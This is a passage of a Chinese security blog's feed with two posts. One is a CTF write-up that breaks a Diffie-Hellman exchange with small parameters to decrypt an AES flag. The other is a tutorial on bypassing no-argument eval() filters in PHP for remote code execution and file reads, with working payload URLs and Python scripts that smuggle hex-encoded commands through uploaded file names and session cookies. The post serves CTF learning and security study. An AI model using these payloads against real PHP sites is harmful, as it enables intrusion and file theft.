class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">p = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'s'</span>: <span class="comment"># server</span></span><br><span class="line">    s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">23333</span>))</span><br><span class="line">    s.listen()</span><br><span class="line">    s, _ = s.accept()</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'c'</span>: <span class="comment"># client</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">23333</span>))</span><br><span class="line"></span><br><span class="line">x = secrets.randbelow(p)</span><br><span class="line">s.send(str(pow(g, x, p)).encode())</span><br><span class="line">r = int(s.recv(<span class="number">2048</span>))</span><br><span class="line">key = pow(r, x, p)</span><br><span class="line">aes = AES.new(sha256(str(key).encode()).digest())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'s'</span>:</span><br><span class="line">    flag = open(<span class="string">'flag.txt'</span>).read()</span><br><span class="line">    flag += <span class="string">' '</span> * (<span class="number">32</span> - len(flag) % <span class="number">32</span>)</span><br><span class="line">    s.send(aes.encrypt(flag))</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'c'</span>:</span><br><span class="line">    print(aes.decrypt(s.recv(<span class="number">2048</span>)))</span><br></pre></td></tr></table></figure></p><p>发现题目是一个Diffle-Hellman密钥交换算法，同时题目用共享密钥key作为AES的密钥加密了flag<br>题目给出了p和g，以及在流量包中有如下值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str(pow(g, x, p)).encode()</span><br><span class="line">r</span><br><span class="line">aes.encrypt(flag)</span><br></pre></td></tr></table></figure></p><p>所以题目思路比较清晰，即利用题目泄露的信息，计算出共享密钥，然后解密密文</p><h3 id="Diffle-Hellman密钥交换算法"><a href="#Diffle-Hellman密钥交换算法" class="headerlink" title="Diffle-Hellman密钥交换算法"></a>Diffle-Hellman密钥交换算法</h3><p>该交换算法原理如下<br>1.Alice和Bob先说好一个大素数p和它的原始根g<br>2.Alice随机产生一个数x， 计算C1=g^x mod p,然后把C1发给Bob；<br>3.Bob随机产生一个数y，计算C2=g^y mod p,然后把C2发给Alice；<br>4.Alice计算k=C2^x mod p;<br>5.Bob计算k*=C1^y mod p;<br>其中值得注意的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k= C2^x mod p= (g^y)^x mod p = (g^x)^y mod p = C1^y mod p = k*</span><br></pre></td></tr></table></figure></p><p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k=k*</span><br></pre></td></tr></table></figure></p><p>那么在该题里，我们有p和g的值<br>同时有<code>g^x mod p</code>和<code>r</code>的值<br>只要我们能通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g^x mod p</span><br></pre></td></tr></table></figure></p><p>计算出x，那么就可以利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r^x mod p</span><br></pre></td></tr></table></figure></p><p>计算出共享密钥k</p><h3 id="私钥计算"><a href="#私钥计算" class="headerlink" title="私钥计算"></a>私钥计算</h3><p>这里我们知道Diffle-Hellman密钥交换算法的安全性建立于有限域上计算离散对数非常困难，但由于这里的g非常小，所以我们可以利用如下脚本进行计算<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g=<span class="number">2</span></span><br><span class="line">po = <span class="number">312827656920665019052154527973062873164155435750834364099549354276600246039780808375717193869518770295806958147314654770520680676883270457649459743668787722703852223185610468575274145823739097462833932263058142549857140269637619269087411010174206045061016542198959480305747562269639856888526630582754886085323913120581662775122656234745332568520238838445916214100660745696922469287938919295619254972946705975683751437282135292172658670815955803075584269128554697234601952297591311295087027674743379383960411103043466786182497597866061129442701995358254124186369249520035589323173168805824570833282035445498782643378768358700682376307190201843700760320696872165065894961224809252051704551991788222733119953751476970741723581723530792919118911052397510799833080000512103966726938986113045128903532639271674853108472379556253636897190191182797552815462576549308131710191832665640046277651599574046021255652154555206626299039923531695289748325251163391286522402130644593746350983380447169395283756146065786333043918764637244487399476582803660120363329563190678655408546077633121456889790401760376550560489115040487451522266237283633048382172370079943143410743342217597309023634940063326550917247604702902550215759784529552401298569555386076473292117763682664669364246320241134117049920406912330431288119412796087737646208534116711021629494365386501930451907402808159838174943862279362834677757884050584093448170667659133693515258906880458166511868847468784977428190810086167564</span></span><br><span class="line">I = Integers(p)</span><br><span class="line">base =I(g)</span><br><span class="line">power = I(po)</span><br><span class="line">x = discrete_log(power,base,I.order()<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">print</span> x</span><br></pre></td></tr></table></figure></p><p>可以计算出x为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">406518553680923303810998357867089986872597384625428296032382082223605988123574210841218447069934463869653305779972123070300843700243223695683842745570568684988254542730892443975304109337441724302279618874884331668884226985266615045139866948788642830842298877192435129229769098933982345569684722762310667192130392534911466160274059969529107046199350538396064656112295906250939672478159817378079309441784880287725371781211748012877184256920210313871719115362010515515110891402855431658223334353873593303525395667978618326801978550187994124468270924013873572498432067645518118093443435418639520888364353499167897138949530744479663644999699224624773483099925521628862586180232198687320947503864600545302221833421275377235509032523457368609815918585758902481553859663387458618816129349463449419087862341088098652933968194993618037910771065808327330647298288575310835586890815804579122178907612697859270737899965594281906994558485264432034470368606167998120003373267066108968891036101743283670490035545481631859464049676062374641157466906693289719168834606604591256752463984131731185528958907446384032245887743211357901745111407737140995225229516243384229267475225313252051953270472323465728081856951111786989858395543299883339743470874543998207949716754885646487861907213598041410526482071904355862055436218492748770410795259787330776539666787777384878258553459788559880593421515430755132522925521857946949333624821971975459183239317332938414550857334189671635116967802683106640</span><br></pre></td></tr></table></figure></p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>得到私钥后，就是计算共享密钥再解密AES了，可以写出如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">r=<span class="number">78087120192506798185304785534036220490682295457985899593552286015760906515956977310718106026282702809422711635619435917331518767851766791450692341186817654392039937276866732823290900777821010247327671241243643650412880368150333211471395035297424887127204256326908722464623917394462679939630749446410387197599335390520467029069728074767246541966424633680601615773218990609115018202108293891151991011803340952544552635132188415103709705346657970777043221314746732187471928545207308547177553542327264672520940226251888781036654093770411265925735389942610651694464713219676594471860313120475954809929673190737166098124441789345848214708040517022155838996124293848907006907419888109057810382829316850548709211468528812150512419577354250048007280565757975359757844819724279701194952271971968109182400983285949430466403580176579808358235196432047919412166611978194160383972820803839428543781819223102375217858138264186633827564726154084918862464617886404527934356701470162555172341817057875835953741671717748853387699781466740938591750994343486592410583776852328678921121336669128939343468165354791232165526407821586702774092562342825423846314736479769371630140795341485570538796652969642206321722350767458962990861456051369560315789943007263349872724565868324293287652102593428824637171300666426843580254096051705945897970157438347228211952956498549949387040740580715926063683264912465718505170513257955773741351861008670710537188992538116637590461265650926502662281478520940158</span></span><br><span class="line">x=<span class="number">406518553680923303810998357867089986872597384625428296032382082223605988123574210841218447069934463869653305779972123070300843700243223695683842745570568684988254542730892443975304109337441724302279618874884331668884226985266615045139866948788642830842298877192435129229769098933982345569684722762310667192130392534911466160274059969529107046199350538396064656112295906250939672478159817378079309441784880287725371781211748012877184256920210313871719115362010515515110891402855431658223334353873593303525395667978618326801978550187994124468270924013873572498432067645518118093443435418639520888364353499167897138949530744479663644999699224624773483099925521628862586180232198687320947503864600545302221833421275377235509032523457368609815918585758902481553859663387458618816129349463449419087862341088098652933968194993618037910771065808327330647298288575310835586890815804579122178907612697859270737899965594281906994558485264432034470368606167998120003373267066108968891036101743283670490035545481631859464049676062374641157466906693289719168834606604591256752463984131731185528958907446384032245887743211357901745111407737140995225229516243384229267475225313252051953270472323465728081856951111786989858395543299883339743470874543998207949716754885646487861907213598041410526482071904355862055436218492748770410795259787330776539666787777384878258553459788559880593421515430755132522925521857946949333624821971975459183239317332938414550857334189671635116967802683106640</span></span><br><span class="line">p=<span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g=<span class="number">2</span></span><br><span class="line">po=<span class="number">312827656920665019052154527973062873164155435750834364099549354276600246039780808375717193869518770295806958147314654770520680676883270457649459743668787722703852223185610468575274145823739097462833932263058142549857140269637619269087411010174206045061016542198959480305747562269639856888526630582754886085323913120581662775122656234745332568520238838445916214100660745696922469287938919295619254972946705975683751437282135292172658670815955803075584269128554697234601952297591311295087027674743379383960411103043466786182497597866061129442701995358254124186369249520035589323173168805824570833282035445498782643378768358700682376307190201843700760320696872165065894961224809252051704551991788222733119953751476970741723581723530792919118911052397510799833080000512103966726938986113045128903532639271674853108472379556253636897190191182797552815462576549308131710191832665640046277651599574046021255652154555206626299039923531695289748325251163391286522402130644593746350983380447169395283756146065786333043918764637244487399476582803660120363329563190678655408546077633121456889790401760376550560489115040487451522266237283633048382172370079943143410743342217597309023634940063326550917247604702902550215759784529552401298569555386076473292117763682664669364246320241134117049920406912330431288119412796087737646208534116711021629494365386501930451907402808159838174943862279362834677757884050584093448170667659133693515258906880458166511868847468784977428190810086167564</span></span><br><span class="line">key = pow(r,x,p)</span><br><span class="line">c = <span class="string">'0e10f06cc8a34a8b93d2f5afd2a32109413fc6c1bdf3985fa55a7427f5befb215afe920b4c9f1c5fd7cd8621eccbce74842474de9eab381535ca5a3d0d21d37a'</span></span><br><span class="line">aes = AES.new(sha256(str(key).encode()).digest())</span><br><span class="line"><span class="keyword">print</span> aes.decrypt(c.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure></p><p>运行后可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2D7A22A4-68C9-46A9-A209-E5623917A864&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这次pwnhub的crypto比以往简单不少……做完后甚至有点不敢相信……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;正逢pwnhub有比赛，于是做了一下题目，以下是题解&lt;/p&gt;
&lt;h2 id=&quot;Happy-Tree-Friends&quot;&gt;&lt;a href=&quot;#H
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>PHP Parametric Function RCE</title>
    <link href="http://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/"/>
    <id>http://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</id>
    <published>2019-03-29T04:50:27.000Z</published>
    <updated>2019-04-04T06:02:55.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做了一些php 无参数函数执行的题目，这里做一个总结，以便以后bypass各种正则过滤。<br>大致思路如下：<br>1.利用超全局变量进行bypass，进行RCE<br>2.进行任意文件读取</p><h2 id="什么是无参数函数RCE"><a href="#什么是无参数函数RCE" class="headerlink" title="什么是无参数函数RCE"></a>什么是无参数函数RCE</h2><p>传统意义上，如果我们有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure></p><p>即代表我们拥有了一句话木马，可以进行getshell，例如<br><img src="/images/2019-03-29-13-00-08.png" alt=""><br>但是如果有如下限制<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们会发现我们使用参数则无法通过正则的校验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br></pre></td></tr></table></figure></p><p>而该正则，正是我们说的无参数函数的校验，其只允许执行如下格式函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a(b(c()));</span><br><span class="line"></span><br><span class="line">a();</span><br></pre></td></tr></table></figure></p><p>但不允许<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a(&apos;123&apos;);</span><br></pre></td></tr></table></figure></p><p>这样一来，失去了参数，我们进行RCE的难度则会大幅上升。<br>而本篇文章旨在bypass这种限制，并做出一些更苛刻条件的Bypass。</p><h2 id="法1：getenv"><a href="#法1：getenv" class="headerlink" title="法1：getenv()"></a>法1：getenv()</h2><p>查阅php手册，有非常多的超全局变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br><span class="line">$_REQUEST</span><br><span class="line">$_ENV</span><br></pre></td></tr></table></figure></p><p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code><br><img src="/images/2019-03-29-13-45-53.png" alt=""><br>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：<br><img src="/images/2019-03-29-13-47-19.png" alt=""><br>效果如下<br><img src="/images/2019-03-29-13-46-53.png" alt=""><br>但是我不想要下标，我想要数组的值，那么我们可以使用<br><img src="/images/2019-03-29-13-47-44.png" alt=""><br>两者结合使用即可有如下效果<br><img src="/images/2019-03-29-13-47-02.png" alt=""><br>我们则可用爆破的方式获取数组中任意位置需要的值，那么即可使用getenv()，并获取指定位置的恶意参数</p><h2 id="法二：getallheaders"><a href="#法二：getallheaders" class="headerlink" title="法二：getallheaders()"></a>法二：getallheaders()</h2><p>之前我们获取的是所有环境变量的列表，但其实我们并不需要这么多信息。仅仅http header即可<br>在apache2环境下，我们有函数getallheaders()可返回<br>我们可以看一下返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123; </span><br><span class="line">    [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; </span><br><span class="line">    [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; </span><br><span class="line">    [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; </span><br><span class="line">    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; </span><br><span class="line">    [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; </span><br><span class="line">    [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><br><span class="line">     [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到，成功返回了http header，我们可以在header中做一些自定义的手段，例如<br><img src="/images/2019-03-29-13-14-31.png" alt=""><br>此时我们再将结果中的恶意命令取出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-29-13-15-44.png" alt=""><br>这样一来相当于我们将http header中的sky变成了我们的参数，可用其进行bypass 无参数函数执行<br>例如<br><img src="/images/2019-03-29-13-17-09.png" alt=""><br>那么可以进一步利用http header的sky属性进行rce<br><img src="/images/2019-03-29-13-17-52.png" alt=""></p><h2 id="法三：get-defined-vars"><a href="#法三：get-defined-vars" class="headerlink" title="法三：get_defined_vars()"></a>法三：get_defined_vars()</h2><p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效，我们也没有更加普遍的方式呢？<br>这里我们可以使用get_defined_vars()，首先看一下它的回显<br><img src="/images/2019-03-29-13-20-36.png" alt=""><br>发现其可以回显全局变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure></p><p>我们这里的选择也就具有多样性，可以利用<code>$_GET</code>进行RCE，例如<br><img src="/images/2019-03-29-13-22-28.png" alt=""><br>还是和之前的思路一样，将恶意参数取出<br><img src="/images/2019-03-29-13-23-25.png" alt=""><br>发现可以成功RCE<br>但一般网站喜欢对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure></p><p>做全局过滤，所以我们可以尝试从<code>$_FILES</code>下手，这就需要我们自己写一个上传<br><img src="/images/2019-03-29-13-30-34.png" alt=""><br>可以发现空格会被替换成<code>_</code>，为防止干扰我们用hex编码进行RCE<br><img src="/images/2019-03-29-13-31-48.png" alt=""><br>最终脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('ls /tmp');"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">files = &#123;</span><br><span class="line">  payload: BytesIO(<span class="string">'sky cool!'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span>, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><h2 id="法四：session-id"><a href="#法四：session-id" class="headerlink" title="法四：session_id()"></a>法四：session_id()</h2><p>之前我们使用<code>$_FILES</code>下手，其实这里还能从<code>$_COOKIE</code>下手：<br>我们有函数<br><img src="/images/2019-03-29-13-34-09.png" alt=""><br>可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即<code>hex2bin</code><br>脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/?code=eval(hex2bin(session_id(session_start())));'</span></span><br><span class="line">payload = <span class="string">"echo 'sky cool';"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>即可达成RCE和bypass的目的</p><h2 id="法五：dirname-amp-chdir"><a href="#法五：dirname-amp-chdir" class="headerlink" title="法五：dirname() &amp; chdir()"></a>法五：dirname() &amp; chdir()</h2><p>为什么一定要RCE呢？我们能不能直接读文件？<br>之前的方法都基于可以进行RCE，如果目标真的不能RCE呢？我们能不能进行任意读取？<br>那么想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？<br>首先，我们可以利用<code>getcwd()</code>获取当前目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(getcwd());</span><br><span class="line"></span><br><span class="line">string(13) &quot;/var/www/html&quot;</span><br></pre></td></tr></table></figure></p><p>那么怎么进行当前目录的目录遍历呢？<br>这里用<code>scandir()</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>那么既然不在这一层目录，如何进行目录上跳呢？<br>我们用<code>dirname()</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir ( string $directory ) : bool</span><br></pre></td></tr></table></figure></p><p>将 PHP 的当前目录改为 directory。<br>所以我们这里在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname(getcwd())</span><br></pre></td></tr></table></figure></p><p>进行如下设置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(dirname(getcwd()))</span><br></pre></td></tr></table></figure></p><p>我们尝试读取<code>/var/www/123</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p><p>即可进行文件读取</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>php无参数函数RCE的方式有很多种，主要还是考察对php函数的熟练程度。我相信应该还有更多的方式没有挖掘出来，期待讨论。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近做了一些php 无参数函数执行的题目，这里做一个总结，以便以后bypass各种正则过滤。&lt;br&gt;大致思路如下：&lt;br&gt;1.利用超全局变量
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
